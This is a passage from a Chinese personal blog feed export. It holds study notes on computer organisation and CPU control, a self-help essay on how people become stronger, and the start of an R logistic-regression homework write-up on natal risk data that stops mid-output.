href="#6寄存器间接寻址">#</a> 6，寄存器间接寻址</h5><p>操作数的真正地址存储在寄存器中，需要访存一次。</p><h5 id="7相对寻址"><a class="markdownIt-Anchor" href="#7相对寻址">#</a> 7，相对寻址</h5><p>把 PC 的内容加上指令格式的形式地址 A 形成操作数的有效地址，EA=PC+A。</p><h5 id="8基址寻址"><a class="markdownIt-Anchor" href="#8基址寻址">#</a> 8，基址寻址</h5><p>将 CPU 中基址寄存器（BR）加上指令中形式地址 A 形成有效地址。</p><h5 id="9变址寻址"><a class="markdownIt-Anchor" href="#9变址寻址">#</a> 9，变址寻址</h5><p>有效地址 EA 为指令字中的形式地址 A 和变址寄存器 IX 的内容之和。</p><h5 id="10堆栈寻址"><a class="markdownIt-Anchor" href="#10堆栈寻址">#</a> 10，堆栈寻址</h5><h4 id="risc和cisc"><a class="markdownIt-Anchor" href="#risc和cisc">#</a> RISC 和 CISC</h4><h5 id="cisc的主要特点复杂指令系统"><a class="markdownIt-Anchor" href="#cisc的主要特点复杂指令系统">#</a> CISC 的主要特点（复杂指令系统）</h5><ul><li>指令系统复杂庞大，指令数量一般大于 200+；</li><li>指令长度不固定，指令格式多，寻址方式多；</li><li>可以访存的指令不受限制</li><li>各种指令使用的频度相差很大</li><li>各种指令的执行时间相差很大，大多数指令需要多个时钟周期才能完成</li><li>控制器大多数采用微程序控制，有些指令非常复杂</li><li>难以用优化编译生成高效的目标代码</li></ul><h5 id="risc的主要特点精简指令系统"><a class="markdownIt-Anchor" href="#risc的主要特点精简指令系统">#</a> RISC 的主要特点（精简指令系统）</h5><ul><li>选取使用频率最高的一些简单指令，复杂的指令由简单指令的组合来完成</li><li>指令长度固定，指令格式种类少，寻址方式种类少</li><li>只有 Load/Store 指令访存，其余指令的操作都在寄存器之间进行。</li><li>CPU 中通用寄存器的数量相当多。</li><li>RISC 一定采用指令流水线技术，大部分指令在一个时钟周期内完成。</li><li>以硬布线控制为主，少用或不用微程序控制</li><li>特别重视编译优化工作，减少程序执行时间</li></ul><h4 id="考试可能知识点"><a class="markdownIt-Anchor" href="#考试可能知识点">#</a> 考试可能知识点</h4><ul><li>RISC 必须采用流水线技术，CISC 没有这个强制要求。</li><li></li></ul><h1 id="第五章-中央处理器"><a class="markdownIt-Anchor" href="#第五章-中央处理器">#</a> 第五章 中央处理器</h1><h3 id="cpu的功能和基本结构"><a class="markdownIt-Anchor" href="#cpu的功能和基本结构">#</a> CPU 的功能和基本结构</h3><h5 id="cpu功能"><a class="markdownIt-Anchor" href="#cpu功能">#</a> CPU 功能</h5><p>CPU 由<strong>运算器和控制器</strong>构成。<strong>控制器</strong>负责协调并控制计算机各部件执行程序的指令序列，包括取指令，分析指令和执行指令；<strong>运算器</strong>的功能是对数据进行加工。CPU 的具体功能如下：</p><ul><li><p><strong>指令控制：</strong> 完成取指令，分析指令和执行指令的操作，即程序的顺序控制。（控制器）</p></li><li><p><strong>操作控制：</strong> 一条指令的功能往往由若干操作信号的组合来实现。CPU 管理并产生由内存取出的每条指令的操作信号，把各种操作信号送往相应的部件，从而控制这些部件按照指令的要求进行动作。（控制器）</p></li><li><p><strong>时间控制</strong>：对各种操作加以时间上的控制。时间控制要为时间顺序提供应有的控制信号。（控制器）</p></li><li><p><strong>数据加工</strong>：对数据进行算术和逻辑运算。（运算器）</p></li><li><p><strong>中断处理</strong>：对计算机运行过程中出现的异常情况和特殊请求进行处理。</p></li></ul><h5 id="cpu基本结构"><a class="markdownIt-Anchor" href="#cpu基本结构">#</a> CPU 基本结构</h5><h6 id="1运算器"><a class="markdownIt-Anchor" href="#1运算器">#</a> 1，运算器</h6><ul><li>算术逻辑单元 (ALU)：进行算术 / 逻辑运算</li><li>暂存寄存器</li><li>累加寄存器 ACC</li><li>通用寄存器组：AX,BX,CX,SP 等：可编程指定多种功能的寄存器，可以存放数据和地址</li><li>程序状态字寄存器 PSW ：一些标志位，如 OF（溢出标志位）</li><li>移位器</li><li>计数器 CT</li></ul><h6 id="2控制器"><a class="markdownIt-Anchor" href="#2控制器">#</a> 2，控制器</h6><ul><li>程序计数器 PC：用于指出下一条指令在主存的存放地址</li><li>指令寄存器 IR：用于保存当前执行的那条指令</li><li>指令译码器：仅对<strong>操作码字段</strong>进行译码，向控制器提供特定的操作信号</li><li>存储器地址寄存器：用于存放要访问的主存单元的地址</li><li>存储器数据寄存器：用于存放主存写入或从主存读出的信息</li><li>时序系统</li><li>微操作信号发生器<br>可以区分存储单元中存放是数据还是指令</li></ul><h6 id="一些相关的题知识点"><a class="markdownIt-Anchor" href="#一些相关的题知识点">#</a> 一些相关的题知识点</h6><p>1，n 位 CPU 中，n 指的是数据总线线数。通用寄存器的位数取决于<strong>机器字长</strong>。<br>2，程序计数器 PC 的位数是其主存空间大小和编址方式有关。</p><h3 id="指令执行过程"><a class="markdownIt-Anchor" href="#指令执行过程">#</a> 指令执行过程</h3><h4 id="指令周期-font-colorred重点font"><a class="markdownIt-Anchor" href="#指令周期-font-colorred重点font">#</a> 指令周期 <font color='red'>(重点)</font></h4><p>首先介绍一下不同的周期的概念</p><ul><li>指令周期：一条指令从主存储器取出来到执行完毕所需要的时间，通常将其分为两个阶段–取指令（控制器自动进行的），（分析和）执行指令。</li><li>机器周期（CPU 周期）：一个指令周期由若干个机器周期构成，不同指令周期中机器周期的种类和数量可能不同。每条指令的第一个机器周期都是取指令周期，然后有一个或几个执行周期。常定义机器周期的长度为主存的存取周期<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">T_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</li><li>时钟周期：是计算机操作的最小时间单位。一个机器周期由几个节拍构成</li></ul><h5 id="指令周期的数据流"><a class="markdownIt-Anchor" href="#指令周期的数据流">#</a> 指令周期的数据流</h5><p>根据要求依次访问的数据序列。</p><h6 id="1取指周期"><a class="markdownIt-Anchor" href="#1取指周期">#</a> 1，取指周期</h6><p>根据 PC 中的内容从主存中取出指令代码并存放在 IR，取指令的同时，PC 加 1。</p><h6 id="2间址周期"><a class="markdownIt-Anchor" href="#2间址周期">#</a> 2，间址周期</h6><p>取操作数有效地址。将指令的地址码送到 MAR 中并送到地址总线，此后 CU 向存储器发送读命令，以获取有效地址并存在 MDR。</p><h6 id="3执行周期"><a class="markdownIt-Anchor" href="#3执行周期">#</a> 3，执行周期</h6><p>取操作数，并根据 IR 中的指令字的操作码通过 ALU 产生执行结果。</p><h6 id="4中断周期"><a class="markdownIt-Anchor" href="#4中断周期">#</a> 4，中断周期</h6><p>处理中断请求。</p><h5 id="相关问题和习题"><a class="markdownIt-Anchor" href="#相关问题和习题">#</a> 相关问题和习题</h5><p><strong>1，什么是中断响应？中断周期完毕的重要操作有哪些？</strong></p><ul><li>中断响应就是计算机处理器对中断信号的反应过程。（处理器从发现中断请求，中断现运营程序到调出中断服务程序的过程称为中断响应。重要操作：关中断，保护断点和找到中断源。</li></ul><h3 id="数据通路"><a class="markdownIt-Anchor" href="#数据通路">#</a> 数据通路</h3><p>这个章节体现在题的主要就是画出微程序控制信号之类的，还有就是执行某条指令后画出相对应的程序狂徒。</p><h3 id="控制器的功能和工作原理"><a class="markdownIt-Anchor" href="#控制器的功能和工作原理">#</a> 控制器的功能和工作原理</h3><h4 id="硬布线控制器-非重点"><a class="markdownIt-Anchor" href="#硬布线控制器-非重点">#</a> 硬布线控制器 （非重点）</h4><p>基本原理：根据指令的要求，当前的时序以及外部和内部的状态，按照时间的顺序发送一系列微操作控制信号。它由复杂的组合逻辑门电路和一些触发器构成，又称组合逻辑控制器。</p><h4 id="微程序控制器-font-colorred重点font"><a class="markdownIt-Anchor" href="#微程序控制器-font-colorred重点font">#</a> 微程序控制器 <font color='red'>重点</font></h4><h5 id="相关的术语和概念"><a class="markdownIt-Anchor" href="#相关的术语和概念">#</a> 相关的术语和概念</h5><h6 id="1微命令和微操作"><a class="markdownIt-Anchor" href="#1微命令和微操作">#</a> 1，微命令和微操作</h6><ul><li>微命令：微操作的<strong>控制信号</strong>，是构成控制信号序列的最小单位。控制部件通过控制总线向执行部件发出的各种控制命令。</li><li>微操作：执行部件接受微命令后进行的操作。<br>二者的关系：微命令是微操作的控制信号，而微操作是微命令所控制的操作过程。</li></ul><h6 id="2微指令和微周期"><a class="markdownIt-Anchor" href="#2微指令和微周期">#</a> 2，微指令和微周期</h6><ul><li>微指令：若干微命令的组合；每个微周期的操作所需的控制命令；控制存储器中每个单元存放的编码字信息。实质：一般是把一条机器指令中一个机器周期中的微操作所需命令信息放在一条微指令中。</li><li>微周期：即微指令周期，从控存中取出一条微指令并执行相应的微操作所需要的时间。</li><li>微指令格式  <code>|微操作码字段|微地址码字段|</code></li></ul><h6 id="3微程序和微程序设计"><a class="markdownIt-Anchor" href="#3微程序和微程序设计">#</a> 3，微程序和微程序设计</h6><ul><li>微程序：一系列微指令的有序集合。一段微程序通常对应实现一条机器指令的功能。</li><li>微程序设计：将传统的程序设计方法运用到控制  器的设计中，设计与各条机器指令相  对应的微程序的过程。</li></ul><h6 id="4控制存储器"><a class="markdownIt-Anchor" href="#4控制存储器">#</a> 4，控制存储器</h6><p>存放微程序的存储器，又名微程序存储器，简称控存；一般用 ROM 实现。CM 每个单元存放一条微指令代码，CM 字长一般远大于机器字长，CM 容量取决于微指令字长和微程序总长度。</p><h5 id="微指令的编码方式"><a class="markdownIt-Anchor" href="#微指令的编码方式">#</a> 微指令的编码方式</h5><p><strong>（1）直接编码方式</strong><br>即每一个位都代表一个微命令，0 为不选用，1 为选用命令。这样编码优点：简单，直观，执行速度快，操作并行性好；缺点是：指令字长过长，n 个微命令就要求微指令的操作字段有 n 位，造成控制存储器容量极大。<br><strong>（2）字段直接编码方式</strong><br>将微指令的微命令字段分成若干个小字段，把互斥性微命令组合在同一字段中，把相容性微命令组合在不同字段中，每个字段独立编码，每种编码代表一个微命令且各字段编码含义单独定义，与其他字段无关。</p><h5 id="微指令的格式"><a class="markdownIt-Anchor" href="#微指令的格式">#</a> 微指令的格式</h5><p><strong>（1）水平型微指令。优点：执行速度快，微程序短。缺点：微指令长，编写微程序麻烦。</strong><br><strong>（2）垂直型微指令。优点：微指令短便于编写微程序；缺点微程序长，执行速度慢，效率低。</strong></p><h6 id="二者的比较"><a class="markdownIt-Anchor" href="#二者的比较">#</a> 二者的比较</h6><ul><li>水平型微指令并行操作能力强效率高，灵活性强；垂直性微指令较差。</li><li>水平型微指令执行一条指令的时间短；垂直型微指令执行的时间长。</li><li>由于水平型微指令解释指令的微程序，具有微指令字段较长但微程序短的特点；垂直性微指令则与之相反，其微指令字较短而微程序长。</li><li>水平型微指令用户难以掌握，而垂直型微指令与指令比较相似，相对容易掌握。</li></ul><h5 id="微程序控制器和硬布线控制器的区别"><a class="markdownIt-Anchor" href="#微程序控制器和硬布线控制器的区别">#</a> 微程序控制器和硬布线控制器的区别</h5><ul><li>微程序控制器：具有规整性，灵活性，可维护性等一系列优点；去欸但是由于采用了存储程序的原理，所以每条指令都要从控制存储器中取一次，影响速度。</li><li>硬布线控制器：优点是控制器的速度取决于电路延迟，所以速度快；缺点是由于将控制部件视为专门产生固定时序控制信号的逻辑电路，所以把用最少元件和取得最高速度作为设计目标，不容易扩充修改。</li></ul><h1 id="第六章-总线"><a class="markdownIt-Anchor" href="#第六章-总线">#</a> 第六章 总线</h1><p>【定义】一组能为多个部件共享的公共信息传送路线。分时和共享是总线的两个特点。</p><ul><li>主设备：指获得总线控制权的设备。</li><li>从设备：指被主设备访问的设备，它只能响应从主设备发送来的各种总线命令。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 计算机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人是怎么变强的</title>
      <link href="/2023/12/12/%E4%BA%BA%E6%98%AF%E6%80%8E%E4%B9%88%E5%8F%98%E5%BC%BA%E7%9A%84/"/>
      <url>/2023/12/12/%E4%BA%BA%E6%98%AF%E6%80%8E%E4%B9%88%E5%8F%98%E5%BC%BA%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<p>人想要变强就三点 —— 获得黑色生命力，抵抗时间扭曲，和创造。</p><p>而许多人连第一个坎都是捱不过去的。</p><h2 id="1"><a class="markdownIt-Anchor" href="#1">#</a> 1</h2><p>先来说说何谓黑色生命力。</p><p>它是指，不断的被痛苦压住，又不断的翻身把痛苦给予痛击，并在这个互相搏击的过程中，获得一种更加旺盛的生命力。</p><p>不知道你们有没有看过这句话啊，我在第一次看见的时候，就被深深的共鸣了 ——</p><p>“每个优秀的人，都有一段至暗时光。”</p><p>在许多人眼中，强大的人都是这样的：从小学一路学霸到研究生，从小员工一路打怪升级到副总裁，人挡杀人佛挡杀佛，雷厉风行见招拆招……</p><p>这是很多人都会有的一种线性思维，觉得身边的一切都是按照一种直线的、均匀不变的方式运行着。牛逼的人就该从小牛逼到大，屌丝逆袭总是只存在于地摊小说中。</p><p>然而，真实的世界却并非如此。</p><p>因为在真实世界中，绝大多数事与人的发展都不是 “线性” 的，生活充满了笑话和变数。</p><p>今天你可能刚中了 500 万的彩票，结果出门就被车撞了；今天你可能刚求婚成功，结果婚礼那天老婆就上了前男友的保时捷。</p><p>ww，生活远比小说要精彩。</p><p>总之，每个人的人生函数都不可能是一根直线，而是一条不断震荡的曲线。</p><p>而几乎每一个人的人生曲线，都无可避免的，有过至少一段 “剧烈滑落” 的区间，那就是每个人都必然会经历的 “至暗时光”。</p><p>强大的人就诞生于此。</p><p>因为在这段剧烈滑落的波谷中，有人爬了上来，有人却再也没有，他的自信与勇气在被 “至暗时光” 彻底击碎后，就再也没能回来。</p><p>在这里，他需要经历的远比他尚未成熟的心灵想象得更多，比如，世界观的重构，三观的崩坏，不公平的碾压，自我怀疑的低谷……</p><p>但如果存活于此，就会得到一种「黑色生命力」（Black vitality）。</p><p>每个人身上都有一种生命力，支撑着我们活着，度过每一天。<br>而有一种生命力，是只能在经受过失望、逆境或创伤，并渡过、幸存下来的人才能够获得的。</p><p>拥有黑色生命力的人几乎是无敌的，说得中二一点，他们就像是 “从地狱回来了的人”。</p><p>在情绪方面，他们熟悉痛苦，会比没有经历过重大创伤的人更懂得如何处理痛苦，痛苦的人比快乐的人共情能力更强，当然治愈力也更好。</p><p>在认知方面，他们会有一种对复杂现实的理解能力，对真实世界的狗血和魔幻，他们的认知会高于一般人。</p><p>比如 “世界上我最爱的人却伤害了我”，“我这么努力了却还是没有回报” 等等，这种换一般小女生会哭天抢地的事情，他们不再会太过 care。</p><p>他们更懂得从不同的视角看待真实，当别人都在抱怨 “为什么是我？” 的时候，他们已经能自我安慰 “为什么不能是我？”</p><p>因为，在度过创伤的日子里，他们体会到了自己比想象中更强大，更相信自己是可以依靠的</p><p>所以，人想要变强，首先就要从低谷中走出来，并且得到 “黑色生命力”。</p><p>我也是从多次这种低谷走出来，给你一些我的生命力小经验：</p><p>1、接纳自己的一切负面情绪</p><p>不要压抑自己，难过时就要理解自己在难过，最好可以去大哭一场，只有先接纳你的负面情绪，你才能在最后与它和解。</p><p>2、相信自己的痛苦是有意义的</p><p>当人在经历一件事感受到煎熬时，如果能想到完成这件事的动机和意义时，其实就不会那么难过了。</p><p>人其实并不是害怕痛苦，而是害怕毫无意义的痛苦。所以，要相信你所有经历的，都是为了让你成长呀。</p><p>3、不要给自己贴标签</p><p>在自我怀疑的过程中，你可能会不自觉的给自己贴很多标签，比如：我是个很自闭的人，我什么事都做不好，我没有人喜欢……</p><p>停！当你意识到你开始通过一件事情评价整个自己的时候，就要打住，并且要不断找证据去推翻这个标签，比如：</p><p>真的吗？真的从小到大没有任何一个人愿意和我做朋友吗？真的我从来没有在人前主动说过一句话吗？我真的没有和人聊天很开心的时候吗？</p><p>你会找到许多证据去推翻这个标签，并且要相信，你会蜕变成一个更好的，更值得的人。</p><p>有人说，曾经经历过的创伤会形成一道伤疤。</p><p>但一道伤疤，同时也是一枚勋章，它提醒着你曾经有过的抗争、取得的胜利。面对黑暗，你仍然有穿越它并获得力量的权利。</p><p>对了，看到这里说明你也是个有独立思考能力，能够认真阅读的人，希望你花一秒给我点个赞，也能加深对这个回答的记忆点哦～</p><p>因为这是我很用心写的内容，如果你能给我一个赞支持一下就太好啦</p><h2 id="2"><a class="markdownIt-Anchor" href="#2">#</a> 2</h2><p>再来说说抵抗时间扭曲是怎么回事。</p><p>这个概念有点悬，我先说说你我应该都有的一种感觉。</p><p>越是长大，我们越会时间过得越来越快。连《进击的巨人》都是 7 年前的动漫了，没想到吧？</p><p>但回顾童年时，我们却感觉时间过得很慢，每天都非常充实，好像在另一个星球里放肆地玩了很久。</p><p>对这种时间感知度不同的现象，网上有一个很有趣的解释，</p><p>“五岁的时候，人的记忆只有五年，这时候过一年，到六岁时，记忆增加了五分之一。<br>六岁到七岁，记忆增加了六分之一。<br>七岁到八岁记忆就只增加了七分之一。<br>以此类推，到了二十岁的时候，记忆便只增加二十分之一。<br>这一年的时光虽然没变，但是参照物变了，所以大家就感觉时间过得快了。<br>可能等你六十岁的的时候，过一年记忆只增加六十分之一，那时时间就过得更快了。‘”</p><p>所以即使时间从未改变过，但在我们的主观感觉上，时间就被 “扭曲” 了。</p><p>而一般人，很难察觉到时间扭曲对自己产生的影响。这个影响在心理学上叫做「时间贴现」（Time Discounting）。</p><p>它是指，当时间流逝得越快，我们对做一件事的未来价值估计就会越下降。我们会越发感受不到未来的存在，而只关注当下怎么样。</p><p>所以，许多人才会有这样的心态：</p><p>学这个东西干什么？10 年后都不知道这个岗位还在不在。</p><p>—— 但你学或不学，10 年后都会到来，区别在于，如果学了，到时你还多了一种可能性。</p><p>做这个事情干什么？又看不到什么效果。</p><p>—— 但你做或不做，这件事的效果都是会存在的。区别在于，它是会在当下就对你产生影响，还是在未来会对你产生影响。</p><p>毕竟我们是根据做一件事到底有多少价值去行动的…… 所以对时间的认知度，会直接影响到我们的行为。</p><p>时间就像一面透镜，会对我们对价值的判断进行扭曲，会让我们变得短视，沉迷即时满足，很难踏实下来去为自己做一件有长期价值的事情。</p><p>宁愿先开一把王者享受当下，也不愿意为了下个月的期末考试认真一把。</p><p>但强大的人，往往会刻意锻炼自己抵抗时间扭曲的能力，不被时间贴现所影响。他们对时间的敏感度超于常人。</p><p>所以想要变强，就要察觉到时间对你的诅咒，并且有意识的去克服它。给你两个小建议：</p><p>1、每天花 1 个小时去做一件有长期价值的事</p><p>比如：培养一个爱好，学习一门技能，读 10 页书……</p><p>一定要保证在很长的一个周期内你都会坚持去做它，得到什么结果无所谓，重要的是得让自己每天都有一点进步，感受到时间真实的流逝。</p><p>2、每天为自己的生活找点变化</p><p>不要让自己每一天都只做一成不变的事情，因为越是只做重复性的动作，大脑就越会倾向于遗忘这段记忆！（因为没什么营养和新鲜感）</p><p>所以要每天都找点和昨天不一样的东西去做，比如偶尔换一条路去上学，每天都换一张手机壁纸，定期更新一下桌面的绿植……</p><p>这些微小的变化，都会留在你经历过的每一段时间，每一段记忆里。</p><h2 id="3"><a class="markdownIt-Anchor" href="#3">#</a> 3</h2><p>最后说说，强大的人是怎么去创造的。</p><p>不知道你有没有注意过，我们每个人在生活中的角色都是消费者 —— 不是指只有花钱的那种消费，时间，注意力的消费也算。</p><p>你花几十块钱买了一杯奶茶，一根口红，是金钱上的消费。<br>你花了两个小时去刷抖音，看电影，是时间上的消费。<br>你一边心不在焉的应付作业一边兴致满满的和朋友聊天，是注意力上的消费。</p><p>你仔细想一想，我们的生活中是不是充满了各种各样的消费？我们用金钱，时间，注意力去为自己换取一些物质，娱乐，人际关系～</p><p>但只有极少数的人，会去主动尝试把消费模式切换成创造模式。也就是不仅会消费，还会主动去创造。</p><p>当你看到了一篇优秀的文章，你花费时间去阅读消费了它。但你有没有想过自己也按照这篇文章的结构和手法，去创造一篇文章呢？</p><p>当你看到了一部很精彩的悬疑电影，你花费注意力去观看消费了它。但你有没有想过去主动拆解作者埋伏笔和设线索的手法，去做一期电影解析呢？</p><p>哪怕是一个会打游戏的人，都不要仅仅停留在 “玩” 的这个消费层面。当然不用也去做一个游戏，主动寻找游戏彩蛋，创造新的玩法，写攻略分享出去，也是一种创造。</p><p>* 一些自由度极高的游戏里这种大神经常出没，比如《塞尔达传说》和《我的世界》。</p><p>一件事物最终呈现在消费者面前，背后一定是经过了层层设计和思考的 ——</p><p>而当你不满足于它的表象，试着将它用你的方式呈现在大众面前的时候，你就算是从一个消费者变为了创造者。</p><p>这是一个需要调动深度思考能力和执行力的过程，也是厉害的人和普通人的思维和行动模式的差别。</p><p>应试教育给我们的学习暗示，很多都是错的。所以你需要从填鸭式学习，改变为创造式学习。</p><p>这也是为什么我一直非常敬佩同人作家和画手的原因，他们是在真正的用兴趣去推动自己的创造力，用创作去平自己的意难平，而不是单纯的 “磕到了磕到了！”</p><p>当你开始创造时，你会感受到比你单纯停留在「消费」时更高层级、更丰富的体验感。</p><p>所以，如果你有了感兴趣的东西，试着不要只是去消费它，而是去参与创造它 ——</p><p>1、保持好奇心和探索欲</p><p>好奇心是一切创造的起点，它可以帮我们保持尝试和探索新事物的源动力，即使是从大家司空见惯的事物中，也能发现许多值得探索的点。</p><p>多去尝试新事物，多从旧事物中找到新细节，以及，时刻保持问自己 “为什么” 的能力。</p><p>2、没事多去 “拆” 东西</p><p>很多熊孩子小时候都喜欢拆东西，虽然这种行为经常挨打，但这也正是我们了解一样事物构造最简单粗暴的方式。</p><p>长大后虽然我们不能再这么破坏东西了，但我们仍然可以有许多可 “拆” 的东西：</p><ul><li>它是由哪些部分组成的？组装逻辑是什么？</li><li>这些部分还可以和什么东西联系起来？</li><li>我要怎么才能用上它？</li></ul><p>最后，再为你总结一下，人是怎么变强的？</p><p>首先是能够从低谷中获得黑色生命力，其次是对抗时空扭曲的能力，最后，从消费者成为创造者。</p>]]></content>
      
      
      <categories>
          
          <category> 思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据科学导论+学习过程</title>
      <link href="/2023/12/12/%E6%95%B0%E6%8D%AE%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%AE%9E%E9%AA%8C/"/>
      <url>/2023/12/12/%E6%95%B0%E6%8D%AE%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>大概把这次作业 6 的实现过程记录一下吧，因为在过程中发现了很多数据分析很有用的一些知识，这里记录一下，以后可能会用到。<br><a href="https://zhuanlan.zhihu.com/p/629713770">R 语言实战 - 基于 Logistic 回归模型的构建及验证 - 文章依据</a><br><a href="https://zhuanlan.zhihu.com/p/535482448"> R 语言 Logistic 回归～变量筛选 </a><br><a href="https://zhuanlan.zhihu.com/p/31446651">我该咋筛选变量进入多因素回归</a><br><a href="https://www.zhihu.com/question/36730804"> logistics 回归建立预后模型过程中自变量太多，如何筛选？</a><br>上面是学习过程中学习的文章。<br>具体流程如下：<br>使用的 R 语言包如下：</p><table><thead><tr><th></th></tr></thead><tbody><tr><td>library(mice)<br><br>library(autoReg)<br><br>library(rms)<br><br>library(caret)<br><br>library(pROC)<br><br>library(rmda)<br><br>library(dplyr)<br><br>library(rrtable)</td></tr></tbody></table><p>根据 PPT 提供的网址获取预处理过后的数据集 NatalRiskData.rData，进入 Rstudio 并使用 load 函数加载数据集。</p><p>由于数据已经经过预处理，我们通过 skimr::skim (sdata) 可以对数据进行分析，分析结果如下：</p><table><thead><tr><th></th></tr></thead><tbody><tr><td>![](file:///C:/Users/GUOXIA~1/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png)</td></tr></tbody></table><p>之后我们可以用 autoReg 包制作表格来展示各个分类变量的数据特征。</p><blockquote><p>ft &lt;- gaze(atRisk~.,data=sdata) %&gt;%myft()</p></blockquote><blockquote><p>print(ft)</p></blockquote><table><thead><tr><th></th></tr></thead><tbody><tr><td>![Uploaded image](file:///C:/Users/GUOXIA~1/AppData/Local/Temp/msohtmlclip1/01/clip_image004.png)<br><br>PWGT: 可能代表体重（Pregnant Weight），可能是在特定的医疗背景下测量的体重，比如妊娠期体重。<br><br>UPREVIS: 可能代表了某种类型的修订或更新次数（Update Revisions），或者是预定的访问次数（Prenatal Visits）。<br><br>CIG_REC: 可能指的是吸烟记录（Cigarette Record），表示个体是否有吸烟的习惯。<br><br>GESTREC3: 这个变量可能与妊娠期（Gestation Record）有关，特别是与妊娠周期的长度有关。<br><br>DPLURAL: 可能代表的是出生时胎儿的数量（Delivery Plurality），如单胞胎、双胞胎或三胞胎及以上。<br><br>ULD_MECO: 可能代表的是与胎儿的粪便（Meconium）有关的紧急劳动解除（Urgent Labor Decisions Meconium）。<br><br>ULD_PRECIP: 可能指的是急速分娩（Urgent Labor Decisions Precipitate），即分娩过程异常迅速的情况。<br><br>ULD_BREECH: 可能指的是臀位分娩（Urgent Labor Decisions Breech），即胎儿在分娩时臀部或脚部先行的情况。<br><br>URF_DIAB: 可能代表妊娠期糖尿病（Urgent Risk Factor Diabetes）的记录。<br><br>URF_CHYPER: 可能代表妊娠期慢性高血压（Urgent Risk Factor Chronic Hypertension）的记录。<br><br>URF_PHYPER: 可能代表妊娠期短暂高血压（Urgent Risk Factor Preeclampsia Hypertension）的记录。<br><br>URF_ECLAM: 可能代表子痫前期（Urgent Risk Factor Eclampsia），这是一种怀孕晚期的高血压疾病。<br><br>DBWT: 可能代表出生时的体重（Delivery Birth Weight）。<br><br>ORIGRANDGROUP: 这个变量不太明确，但可能代表某个原始的随机分组（Original Random Group）。</td></tr></tbody></table><p>在建立测试集和训练集时，我们可以先对数据进变量筛选。这里我选择先单后多的变量筛选方式。如果某个变量单因素分析时 P &lt; 0.05 ，就纳入多因素模型。同样，我们可以直接利用 autoReg 包进行实现。</p><p>我们先建立逻辑回归模型。</p><blockquote><p>mod &lt;- glm(atRisk~.,data = sdata,family = “binomial”)</p></blockquote><blockquote><p>summary(mod)</p></blockquote><p>分析结果:</p><table><thead><tr><th></th></tr></thead><tbody><tr><td>![](file:///C:/Users/GUOXIA~1/AppData/Local/Temp/msohtmlclip1/01/clip_image006.png)</td></tr></tbody></table><p>通过上图，我们发现 <strong>PWGT,UPREVIS,GESTREC3,ULD_MECO, ULD_BREECH, DBWT</strong> 这几个的 p 值都低于 0.05，故我们建立逻辑回归模型时可以将其纳入。</p><p>之后，我们需要把数据分为训练集和测试集，在训练集中训练模型并在测试集中进行检验。</p><blockquote><p>set.seed(1234)</p></blockquote><blockquote><p>ind &lt;- createDataPartition(sdata$atRisk,</p></blockquote><p>p=0.8,</p><p>list = FALSE)</p><blockquote><p>train_data &lt;- sdata [ind,] # 训练集</p></blockquote><blockquote><p>test_data &lt;- sdata [-ind,] # 测试集</p></blockquote><p>然后通过基于 rms 包构建 Logistic 回归模型的构建，绘制列线图和校准曲线。</p><blockquote><p>fit &lt;- lrm(atRisk~PWGT+UPREVIS+GESTREC3+ULD_MECO+ULD_BREECH+DBWT,</p></blockquote><p>data = train_data,x=TRUE,y=TRUE)</p><blockquote><p>fit</p></blockquote><table><thead><tr><th></th></tr></thead><tbody><tr><td>![](file:///C:/Users/GUOXIA~1/AppData/Local/Temp/msohtmlclip1/01/clip_image008.png)</td></tr></tbody></table><p>通过结果可以知道每个自变量对结果的影响。</p><p>Intercept（截距）: -1.0618。这是当所有自变量值为 0 时，对数几率（log-odds）的估计值。</p><p>PWGT: 0.0042。这意味着 PWGT 的每个单位增加，与被分类为 atRisk 相关的对数几率增加 0.0042。</p><p>UPREVIS: -0.0318。这意味着 UPREVIS 的每个单位增加，与被分类为 atRisk 相关的对数几率减少 0.0318。</p><p>GESTREC3=&lt; 37 weeks: 0.4968。这表明如果 GESTREC3 小于 37 周，则与被分类为 atRisk 相关的对数几率比 GESTREC3 大于等于 37 周的情况高 0.4968。</p><p>ULD_MECO: 1.0680。这表示 ULD_MECO 为真时，与被分类为 atRisk 相关的对数几率比 ULD_MECO 为假时高 1.0680。</p><p>ULD_BREECH: 0.3340。这表示 ULD_BREECH 为真时，与被分类为 atRisk 相关的对数几率比 ULD_BREECH 为假时高 0.3340。</p><p>DBWT: -0.0012。这意味着 DBWT 的每个单位增加，与被分类为 atRisk 相关的对数几率减少 0.0012。</p><p>通过图中可以知道伪 R - 平方的值为 0.144，![](file:///C:/Users/GUOXIA~1/AppData/Local/Temp/msohtmlclip1/01/clip_image010.png)，AIC 的值为 3353.608。</p><p>之后进行预测并绘制 ROC 曲线。</p><blockquote><p>train_pred &lt;- predict(fit,</p></blockquote><p>newdata=train_data,</p><p>type = “fitted”)</p><blockquote><p>test_pred &lt;- predict(fit,</p></blockquote><p>newdata=test_data,</p><p>type=“fitted”)</p><blockquote><p>train_roc &lt;- roc(train_data$atRisk,train_pred)</p></blockquote><p>Setting levels: control = FALSE, case = TRUE</p><p>Setting direction: controls &lt; cases</p><blockquote><p>auc(train_roc)</p></blockquote><p>Area under the curve: 